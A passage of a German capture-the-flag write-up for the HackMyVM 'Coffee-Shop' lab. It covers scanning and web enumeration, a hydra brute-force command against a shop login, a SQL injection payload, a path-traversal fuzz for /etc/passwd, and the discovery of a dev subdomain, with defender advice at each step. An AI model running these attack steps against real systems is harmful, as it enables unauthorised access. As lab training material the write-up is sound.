@@ -1,0 +1,1047 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coffee-Shop - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Coffee-Shop - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad angepasst, Farbe wird durch CSS gesteuert (Easy = Grün) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tool-Liste aus dem Text extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">mkfifo</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ruby</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation Path)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/hakrawler]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.107	08:00:27:45:5f:39	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment mittels ARP-Requests nach aktiven Geräten abzusuchen. Er listet gefundene Geräte mit IP- und MAC-Adresse auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein aktives Gerät mit der IP-Adresse `192.168.2.107` wurde identifiziert. Die MAC-Adresse `08:00:27:45:5f:39` und der Hersteller `PCS Systemtechnik GmbH` weisen auf eine VirtualBox-Umgebung hin. Dies ist der erste Schritt zur Lokalisierung des Ziels.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die IP `192.168.2.107` als Ziel für weitere Scans vormerken. Die VirtualBox-Information kann später nützlich sein.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring zur Erkennung von ARP-Scans implementieren. Sicherstellen, dass nur autorisierte Geräte im Netzwerk aktiv sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <!-- Keine Ausgabe, da vi interaktiv ist -->
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+#       192.168.2.104   zon.hmv
+#       192.168.2.105   king.vln
+#       192.168.2.106   avengers.vln
+        192.168.2.107   uni.hmv midnight.coffee dev.midnight.coffee
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei des Angreifersystems wird bearbeitet (`vi`) und anschließend angezeigt (`cat`). Der Eintrag `192.168.2.107 uni.hmv midnight.coffee dev.midnight.coffee` wurde hinzugefügt. Dies weist das Angreifersystem an, die Hostnamen `uni.hmv`, `midnight.coffee` und `dev.midnight.coffee` direkt auf die IP-Adresse `192.168.2.107` aufzulösen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist wichtig, da Webserver oft über virtuelle Hosts konfiguriert sind und auf verschiedene Hostnamen unterschiedlich reagieren. Durch das Hinzufügen dieser Einträge können alle potenziellen Webseiten auf dem Zielserver korrekt angesprochen werden. Die Namen deuten auf eine Hauptseite (`uni.hmv` oder `midnight.coffee`) und eine Entwicklungs-Subdomain (`dev.midnight.coffee`) hin.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie alle definierten Hostnamen (`uni.hmv`, `midnight.coffee`, `dev.midnight.coffee`) im Browser und mit Web-Scanning-Tools, da sie unterschiedliche Inhalte oder Funktionalitäten aufweisen könnten.
+             <br><strong>Empfehlung (Admin):</strong> Verstehen, dass Angreifer versuchen werden, verschiedene Hostnamen aufzulösen, um versteckte oder Entwicklungsseiten zu finden. Sicherstellen, dass nicht-öffentliche Seiten (wie Entwicklungsseiten) nicht über das Produktionsnetzwerk erreichbar oder anderweitig geschützt sind (z.B. durch IP-Beschränkungen, Authentifizierung).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/hakrawler]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.107 -p- | grep open</span></div>
+                     <pre>
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein schneller `nmap`-Scan (`-sS` SYN-Scan, `-sV` Version Detection, `-A` Aggressive options, `-T5` Insane timing, `-p-` all ports) wird durchgeführt und die Ausgabe nach offenen Ports gefiltert (`grep open`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports: SSH auf Port 22 (OpenSSH 8.9p1) und HTTP auf Port 80 (Apache 2.4.52). Dies sind die primären Einstiegspunkte für weitere Angriffe.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die detaillierte `nmap`-Ausgabe. Untersuchen Sie den Webserver auf Port 80 und versuchen Sie, die SSH-Version auf bekannte Schwachstellen zu prüfen.
+             <br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf SSH (Port 22) auf vertrauenswürdige IPs. Halten Sie OpenSSH und Apache aktuell. Überwachen Sie fehlgeschlagene Login-Versuche.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.107 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 13:23 CEST
+Nmap scan report for uni.hmv (192.168.2.107)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 81:a4:52:2b:14:3f:13:68:2b:e2:5b:c4:7b:d7:1a:a5 (ECDSA)
+|_  256 25:19:09:29:2f:b8:ea:b4:29:1f:6d:e7:13:d6:be:7e (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Under Construction - Midnight Coffee
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 08:00:27:45:5F:39 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms uni.hmv (192.168.2.107)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des vorherigen `nmap`-Scans. Sie liefert Details zu den offenen Ports 22 (SSH) und 80 (HTTP), inklusive SSH-Hostkeys, Apache-Version und Webseitentitel.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports und Versionen. Der Titel der Webseite auf Port 80 ("Under Construction - Midnight Coffee") gibt einen Hinweis auf den Zweck (`Midnight Coffee`) und den Status (im Aufbau). Das Betriebssystem wird als Linux (Kernel 4.15 - 5.8) geschätzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussieren Sie sich auf den Webserver (Port 80), da dieser wahrscheinlich die Hauptanwendung hostet. Nutzen Sie die in `/etc/hosts` definierten Hostnamen (`uni.hmv`, `midnight.coffee`, `dev.midnight.coffee`), um auf den Webserver zuzugreifen.
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie informative Titel auf "Under Construction"-Seiten. Halten Sie OS und Dienste aktuell. Schränken Sie den SSH-Zugriff ein.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.107</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.107
++ Target Hostname:    192.168.2.107
++ Target Port:        80
++ Start Time:         2024-04-19 13:23:32 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: The X-Content-Type-Options header is not set. [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 69a, size: 60e0d6c9d917a, mtime: gzip. [...]
++ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). [...]
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ /shop/: This might be interesting.
++ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2024-04-19 13:24:02 (GMT2) (30 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf Port 80 (über die IP-Adresse) nach bekannten Schwachstellen und Konfigurationsproblemen zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto meldet:
+                <ul>
+                    <li>Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).</li>
+                    <li>Mögliches ETag-Inode-Leak (geringes Risiko).</li>
+                    <li>Veraltete Apache-Version (2.4.52).</li>
+                    <li>Erlaubte HTTP-Methoden: GET, POST, OPTIONS, HEAD.</li>
+                    <li>**WICHTIG:** Ein interessantes Verzeichnis `/shop/` wurde gefunden.</li>
+                </ul>
+            Das Verzeichnis `/shop/` ist der wichtigste Fund dieses Scans, da die Startseite nur "Under Construction" anzeigte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Verzeichnis `/shop/` genauer. Führen Sie Directory-Brute-Force-Tools (`dirb`, `gobuster`) gezielt auf `http://uni.hmv/shop/` (oder die anderen Hostnamen + `/shop/`) aus.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Aktualisieren Sie Apache. Stellen Sie sicher, dass das `/shop/`-Verzeichnis angemessen geschützt ist und keine unnötigen Informationen preisgibt.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X OPTIONS http://uni.hmv -v</span></div>
+                     <pre>
+* Host uni.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.107
+*   Trying 192.168.2.107:80...
+* Connected to uni.hmv (192.168.2.107) port 80
+> OPTIONS / HTTP/1.1
+> Host: uni.hmv
+> User-Agent: curl/8.5.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Fri, 19 Apr 2024 11:25:50 GMT
+< Server: Apache/2.4.52 (Ubuntu)
+< Allow: GET,POST,OPTIONS,HEAD
+< Content-Length: 0
+< Content-Type: text/html
+<
+* Connection #0 to host uni.hmv left intact
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit `curl` wird eine HTTP-OPTIONS-Anfrage an das Root-Verzeichnis (`/`) des Hosts `uni.hmv` gesendet. `-X OPTIONS` spezifiziert die HTTP-Methode, `-v` (verbose) zeigt detaillierte Request- und Response-Header an.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `200 OK` und dem `Allow`-Header, der die erlaubten HTTP-Methoden für das Root-Verzeichnis auflistet: `GET, POST, OPTIONS, HEAD`. Es wurden keine ungewöhnlichen oder gefährlichen Methoden wie `PUT` oder `DELETE` gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Information bestätigt die Standardkonfiguration. Fahren Sie mit der Untersuchung des `/shop/`-Verzeichnisses fort.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige HTTP-Methoden erlaubt sind. Insbesondere `PUT` und `DELETE` sollten nur aktiviert werden, wenn sie explizit benötigt und entsprechend abgesichert sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Interaction / Source Code Review]</div>
+                     <pre>
+# Zugriff auf: http://uni.hmv (oder midnight.coffee)
+# Gefundene Informationen im HTML-Quelltext oder auf der Seite:
+<h2>Our Shop Locations</h2>
+<p>25 Moonlight Street, Midnight City</p>
+<p>Open until 3 AM</p>
+
+<h2>Contact Us</h2>
+<p>Email: shopadmin@midnight.coffee</p>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Webseite (vermutlich die "Under Construction"-Seite oder eine andere Seite) wird manuell inspiziert, wobei Kontaktinformationen gefunden werden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine E-Mail-Adresse `shopadmin@midnight.coffee` wurde gefunden. Der Benutzerteil (`shopadmin`) ist ein sehr wahrscheinlicher Benutzername für Administrations- oder Systemkonten. Die Domain `midnight.coffee` wurde bereits in `/etc/hosts` definiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `shopadmin` zur Liste potenzieller Benutzernamen hinzu. Versuchen Sie, dieses Konto mit Passwortlisten (z.B. `rockyou.txt`) auf verschiedenen Diensten (Web-Login im `/shop/`, SSH) zu bruteforcen.
+             <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Verwendung von Rollen-basierten Namen (wie `admin`, `shopadmin`, `support`) als Benutzernamen, da diese leicht zu erraten sind. Verwenden Sie stattdessen weniger vorhersagbare Benutzernamen.</p>
+
+        </section>
+
+        <section id="web-enumeration"> <!-- Fortsetzung der Web Enum -->
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/hakrawler]
+└─# <span class="command">hydra -l shopadmin -P /usr/share/wordlists/rockyou.txt uni.hmv http-post-form "/shop/login.php:username=shopadmin&password=^PASS^:Invalid username or password."</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak [...]
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-19 13:47:38
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344496 login tries (l:1/p:14344496), ~896531 tries per task
+[DATA] attacking http-post-form://uni.hmv:80/shop/login.php:username=shopadmin&password=^PASS^:Invalid username or password.
+[...]
+[STATUS] 4627.29 tries/min, 32391 tries in 00:07h, 14312105 to do in 51:33h, 16 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `hydra` einen Brute-Force-Angriff auf das Login-Formular unter `http://uni.hmv/shop/login.php` durchzuführen.
+                <ul>
+                    <li>`-l shopadmin`: Der Zielbenutzername.</li>
+                    <li>`-P /usr/share/wordlists/rockyou.txt`: Die Passwortliste.</li>
+                    <li>`uni.hmv`: Der Zielhost.</li>
+                    <li>`http-post-form`: Das zu verwendende Hydra-Modul.</li>
+                    <li>`"/shop/login.php:username=shopadmin&password=^PASS^:Invalid username or password."`: Die Modulparameter:
+                        <ul>
+                            <li>`/shop/login.php`: Der Pfad zum Login-Skript.</li>
+                            <li>`username=shopadmin&password=^PASS^`: Die zu sendenden POST-Daten, wobei `^PASS^` durch Passwörter aus der Liste ersetzt wird.</li>
+                            <li>`Invalid username or password.`: Die Zeichenkette in der Antwort, die einen fehlgeschlagenen Login anzeigt.</li>
+                        </ul>
+                    </li>
+                </ul>
+            Der Angriff wird nach einiger Zeit manuell abgebrochen (`^C`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Brute-Force-Angriff auf das Web-Login für `shopadmin` mit `rockyou.txt` war bisher erfolglos und wurde abgebrochen, wahrscheinlich aufgrund der langen erwarteten Laufzeit. Das Passwort befindet sich nicht in den ersten ~32000 Einträgen von `rockyou.txt`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Brute-Force-Angriffe können sehr zeitaufwendig sein. Konzentrieren Sie sich auf andere Methoden wie Subdomain-Enumeration oder die Suche nach anderen Schwachstellen, bevor Sie den Brute-Force fortsetzen oder größere Passwortlisten verwenden.
+             <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Schutzmaßnahmen gegen Web-Brute-Force-Angriffe wie Account Lockout, Captchas oder Rate Limiting.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual SQL Injection Test Attempt]</div>
+                     <pre>
+# Versuchter Zugriff auf URL: http://192.168.2.107/shop/login.php?username=shopadmin&password=admin
+# Antwort enthält: Invalid username or password.
+
+# Versuchter SQL Injection Payload im Browser oder Tool:
+# username=shopadmin' OR '1'='1 -- -
+# (Die genaue Methode ist unklar, aber dies ist ein typischer Payload)
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird manuell versucht, eine SQL-Injection-Schwachstelle im Login-Formular auszunutzen. Zuerst wird ein normaler Login-Versuch mit `password=admin` gezeigt, der fehlschlägt. Anschließend wird ein typischer SQL-Injection-Payload (`' OR '1'='1 -- -`) erwähnt, der wahrscheinlich im `username`- oder `password`-Feld eingegeben wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Text liefert kein Ergebnis dieses SQL-Injection-Versuchs. Ohne eine Antwort vom Server (z.B. erfolgreicher Login, Fehlermeldung) kann nicht beurteilt werden, ob die Anwendung anfällig ist. Da `sqlmap` später nicht erwähnt wird, war dieser manuelle Versuch wahrscheinlich erfolglos.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie systematisch auf SQL Injection mit verschiedenen Payloads und Techniken (z.B. UNION-based, error-based, blind). Verwenden Sie spezialisierte Tools wie `sqlmap`, um den Prozess zu automatisieren und zu beschleunigen.
+             <br><strong>Empfehlung (Admin):</strong> Verwenden Sie immer Prepared Statements (parametrisierte Abfragen) und validieren/sanitisieren Sie alle Benutzereingaben, um SQL Injection zu verhindern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://uni.hmv -x [...] -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+[...]
+http://uni.hmv/index.html           (Status: 200) [Size: 1690]
+http://uni.hmv/shop                 (Status: 301) [Size: 301] [--> http://uni.hmv/shop/]
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird erneut verwendet, um das Root-Verzeichnis von `http://uni.hmv` nach Verzeichnissen und Dateien zu durchsuchen, diesmal mit der `directory-list-2.3-medium.txt` und einer langen Liste von Erweiterungen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut die Existenz von `/index.html` und `/shop/`. Keine neuen relevanten Funde im Root-Verzeichnis.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `gobuster` oder `dirb` gezielt auf das Verzeichnis `/shop/` aus.
+             <br><strong>Empfehlung (Admin):</strong> Die Empfehlungen zur Verhinderung von Directory Enumeration bleiben bestehen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/hakrawler]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://uni.hmv" -H "Host: FUZZ.uni.hmv" --hc "404" --hh 1690</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://uni.hmv/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000009532:   400        10 L     35 W       301 Ch      "#www"
+000010581:   400        10 L     35 W       301 Ch      "#mail"
+000047706:   400        10 L     35 W       301 Ch      "#smtp"
+000103135:   400        10 L     35 W       301 Ch      "#pop3"
+
+Total time: [...]
+Processed Requests: 114441
+Filtered Requests: 114437
+Requests/sec.: [...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird für die Subdomain-Enumeration mittels Virtual Host Fuzzing verwendet.
+                <ul>
+                    <li>`-c`: Farbige Ausgabe.</li>
+                    <li>`-w ...`: Wortliste mit potenziellen Subdomain-Namen.</li>
+                    <li>`-u "http://uni.hmv"`: Basis-URL (IP wäre hier besser, um DNS-Probleme zu vermeiden, aber `uni.hmv` ist in `/etc/hosts` eingetragen).</li>
+                    <li>`-H "Host: FUZZ.uni.hmv"`: Setzt den HTTP-Host-Header. `FUZZ` wird durch Einträge aus der Wortliste ersetzt. So wird versucht, auf `subdomain.uni.hmv` zuzugreifen.</li>
+                    <li>`--hc "404"`: Versteckt Antworten mit Statuscode 404 (Not Found).</li>
+                    <li>`--hh 1690`: Versteckt Antworten mit exakt 1690 Zeichen (die Größe der Standardseite `/index.html`, um die Standardantwort herauszufiltern).</li>
+                </ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine gültigen Subdomains für `uni.hmv`. Die angezeigten Ergebnisse (z.B. `#www`) sind wahrscheinlich ungültige Einträge in der Wortliste oder Fehlinterpretationen und liefern einen 400 Bad Request, der nicht herausgefiltert wurde. Es scheint keine weiteren Subdomains unter `uni.hmv` zu geben.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie das Virtual Host Fuzzing auch für die andere Domain `midnight.coffee`, die in `/etc/hosts` eingetragen wurde.
+             <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver so, dass er auf Anfragen an unbekannte Hostnamen mit einer Standardseite oder einem Fehler reagiert und keine Informationen preisgibt. Wildcard-DNS-Einträge sollten vermieden werden, wenn sie nicht benötigt werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/hakrawler]
+└─# <span class="command">dirb http://192.168.2.107</span></div>
+                     <pre>
+[...]
+---- Entering directory: http://192.168.2.107/shop/ ----
++ http://192.168.2.107/shop/index.html (CODE:200|SIZE:2577)
+==> DIRECTORY: http://192.168.2.107/shop/stylesheet/
+[...]
+-----------------
+END_TIME: Fri Apr 19 13:21:50 2024
+DOWNLOADED: 9244 - FOUND: 3
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `dirb` wird erneut ausgeführt, diesmal ohne spezifischen Hostnamen, sondern direkt gegen die IP-Adresse. Es findet das `/shop/`-Verzeichnis und darin eine `index.html` sowie ein Unterverzeichnis `/stylesheet/`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz von `/shop/` und findet darin eine `index.html` sowie ein Stylesheet-Verzeichnis. Keine neuen kritischen Funde, aber eine Bestätigung der Verzeichnisstruktur.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `index.html` und den Inhalt von `/stylesheet/` manuell. Der Fokus sollte aber auf der Login-Funktionalität und der Subdomain-Enumeration für `midnight.coffee` liegen.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen Informationen in Stylesheets oder HTML-Kommentaren enthalten sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://uni.hmv/shop/login.php?FUZZ=../../../../etc/passwd" --hc 404 --hh 1202</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://uni.hmv/shop/login.php?FUZZ=../../../../etc/passwd
+Total requests: [...]
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+
+Total time: [...]
+Processed Requests: [...]
+Filtered Requests: [...]
+Requests/sec.: [...]
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `wfuzz` eine Local File Inclusion (LFI)-Schwachstelle auf `login.php` im `/shop/`-Verzeichnis auszunutzen. Der Payload `../../../../etc/passwd` wird an einen Parameter angehängt, dessen Name (`FUZZ`) mit Einträgen aus einer großen Wortliste (`directory-list-2.3-big.txt`) gefuzzt wird. Es wird versucht, die Datei `/etc/passwd` einzubinden.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert keine Ergebnisse (alle Requests gefiltert). Dies deutet darauf hin, dass `login.php` entweder nicht für LFI anfällig ist oder der Parametername nicht in der Wortliste enthalten war oder dass der Zugriff auf `/etc/passwd` blockiert ist.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> LFI über Parameter-Fuzzing scheint hier nicht erfolgreich. Versuchen Sie andere LFI-Techniken oder konzentrieren Sie sich auf die Subdomain-Enumeration.
+              <br><strong>Empfehlung (Admin):</strong> Auch wenn dieser Versuch fehlschlug, bleiben die allgemeinen Empfehlungen zur Verhinderung von LFI (Input-Validierung, keine Benutzereingaben in Dateipfade einbauen, PHP-Einstellungen härten) relevant.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/hakrawler]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://midnight.coffee" -H "Host: FUZZ.midnight.coffee" --hc "404" --hh 1690</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://midnight.coffee/
+Total requests: [...]
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000019:   200        71 L     152 W      1738 Ch     "dev"
+
+Total time: [...]
+Processed Requests: 20411
+Filtered Requests: 20408
+Requests/sec.: [...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneutes Virtual Host Fuzzing mit `wfuzz`, diesmal aber für die Domain `midnight.coffee`. Es wird nach Subdomains gesucht, indem der `Host`-Header manipuliert wird (`FUZZ.midnight.coffee`). Antworten mit Status 404 oder einer Größe von 1690 Zeichen (Standardseite) werden ausgeblendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Scan findet eine gültige Subdomain: `dev`. Die Antwort hat einen Statuscode 200 und eine andere Größe (1738 Chars) als die Standardseite, was darauf hindeutet, dass `dev.midnight.coffee` existiert und anderen Inhalt liefert.</p>
